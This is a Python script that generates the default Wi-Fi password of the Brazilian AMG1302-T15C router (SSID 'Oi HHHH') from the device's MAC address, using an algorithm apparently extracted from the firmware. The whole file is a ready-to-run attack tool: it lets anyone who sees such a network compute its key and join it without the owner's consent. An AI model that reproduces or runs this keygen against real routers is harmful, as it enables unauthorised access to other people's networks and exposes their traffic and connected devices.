# keygen for the Brazilian AMG1302-T15C with a SSID of Oi HHHH (last 4 letters from MAC)
# thanks to Veredito Oficial for sharing the original firmware on their youtube channel
# https://www.youtube.com/watch?v=g4haRgRKrQ4
# and thanks to dev-zzo for his router tools that allow the extraction of the RasCode from the firmware.
# https://github.com/dev-zzo/router-tools

import hashlib
import argparse

def amg1302_t15c(mac):


	mac_bytes = []
	mac_byte_values = []
	for i in range(0, 12, 2):
		mac_bytes.append(mac[i:i+2])
		mac_byte_values.append(int(mac[i:i+2], 16))

	mac_flipped = mac_byte_values[::-1]
	long_mac = mac_flipped * 2
	seed = int("12345678", 16)
	pseudo_random = []

	for i in range(0, 10):
		xor_mask1 = seed & 255
		xor_mask2 = seed >> 5 & 255
		xor_mask3 = xor_mask1 ^ xor_mask2
		new_byte = long_mac[i] ^ xor_mask3
		pseudo_random.append(new_byte)

		new_seed = seed >> 8
		seed_modifier = new_byte << 15
		seed = new_seed | seed_modifier

	charset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
	moduli = []
	for i in pseudo_random:
		moduli.append(i % len(charset))

	password = []
	for i in moduli:
		password.append(charset[i])

	L3 = pseudo_random[0] % 10
	L6 = pseudo_random[1] % 26
	L9 = pseudo_random[2] % 26

	password[2] = chr(L3 + 48)
	password[5] = chr(L6 + 97)
	password[8] = chr(L9 + 65)
	password = "".join(password)
	
	print(password)


parser = argparse.ArgumentParser(description='Keygen for the Brazilian AMG1302-T15C with a SSID of Oi HHHH (last 4 letters from MAC)')
parser.add_argument('mac', help='Mac address')
args = parser.parse_args()

amg1302_t15c(args.mac)